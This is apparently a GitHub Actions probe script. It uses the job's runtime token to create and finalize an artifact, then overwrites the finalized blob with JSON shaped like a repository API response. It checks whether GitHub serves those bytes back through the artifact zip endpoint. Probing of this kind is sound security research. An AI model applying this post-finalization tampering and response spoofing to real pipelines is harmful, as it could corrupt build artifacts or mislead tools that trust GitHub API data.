const crypto = require('node:crypto')
const { BlockBlobClient } = require('@azure/storage-blob')

const token = process.env.ACTIONS_RUNTIME_TOKEN
const base = process.env.ACTIONS_RESULTS_URL
const claims = JSON.parse(Buffer.from(token.split('.')[1], 'base64url').toString('utf8'))
const scope = claims.scp.split(' ').find(value => value.startsWith('Actions.Results:'))
const [, runId, jobId] = scope.split(':')
const repo = process.env.GITHUB_REPOSITORY
const name = `raw-text-${process.env.GITHUB_RUN_ID}.txt`

async function rpc(method, data) {
  const url = new URL(`/twirp/github.actions.results.api.v1.ArtifactService/${method}`, base)
  const response = await fetch(url, {
    method: 'POST',
    headers: { Authorization: `Bearer ${token}`, 'Content-Type': 'application/json' },
    body: JSON.stringify(data),
  })
  const body = await response.json()
  if (!response.ok || !body.ok) throw new Error(`${method} returned ${response.status}`)
  return body
}

async function main() {
  const created = await rpc('CreateArtifact', {
    workflow_run_backend_id: runId,
    workflow_job_run_backend_id: jobId,
    name,
    version: 7,
    mime_type: 'text/plain',
  })
  const signedUploadUrl = created.signed_upload_url || created.signedUploadUrl
  const blob = new BlockBlobClient(signedUploadUrl)
  await blob.uploadData(Buffer.from('{}'), { blobHTTPHeaders: { blobContentType: 'text/plain' } })
  const finalized = await rpc('FinalizeArtifact', {
    workflow_run_backend_id: runId,
    workflow_job_run_backend_id: jobId,
    name,
    size: '2',
  })
  const id = finalized.artifact_id || finalized.artifactId
  const repository = `${repo}/actions/artifacts/${id}/zip`
  const payload = Buffer.from(JSON.stringify({
    full_name: repository,
    owner: { login: 'user3at12', avatar_url: 'https://example.com/avatar.png' },
  }))
  await blob.uploadData(payload, { blobHTTPHeaders: { blobContentType: 'text/plain' } })

  const response = await fetch(`https://api.github.com/repos/${repository}`, {
    headers: { Accept: 'application/vnd.github.v3+json', 'User-Agent': 'raw-text-artifact-probe' },
  })
  const downloaded = Buffer.from(await response.arrayBuffer())
  console.log(`artifact_id=${id} status=${response.status} content_type=${JSON.stringify(response.headers.get('content-type'))} bytes_match=${downloaded.equals(payload)} sha256=${crypto.createHash('sha256').update(downloaded).digest('hex')}`)
}

main().catch(error => { console.error(`probe_failed=${error.message}`); process.exitCode = 1 })
